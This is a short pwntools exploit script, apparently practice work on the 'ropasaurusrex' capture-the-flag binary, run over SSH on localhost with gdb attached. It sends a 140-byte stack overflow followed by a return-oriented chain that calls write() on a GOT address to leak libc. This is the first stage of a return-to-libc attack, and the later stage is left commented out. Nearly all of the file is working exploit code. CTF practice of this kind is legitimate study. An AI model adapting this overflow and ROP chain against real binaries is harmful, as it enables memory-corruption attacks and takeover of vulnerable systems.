from pwn import *
import sys
 
s = ssh(host='localhost',user='acidburn',port=2222)
r= s.process('/home/acidburn/Desktop/malicious/rop/ropasaurusrex')
pid=gdb.attach(r)
input("wait")


#r.recvuntil("What is your name?")

address_write = 0x0804830c
got = 0x08049614
next = 0x41414141

payload = 140 * b"A" + p32(address_write) + p32(next) + p32(0) + p32(got) + p32(20)

r.send(payload)

#libc = r.recv_raw(20)
#print(libc)

r.interactive()
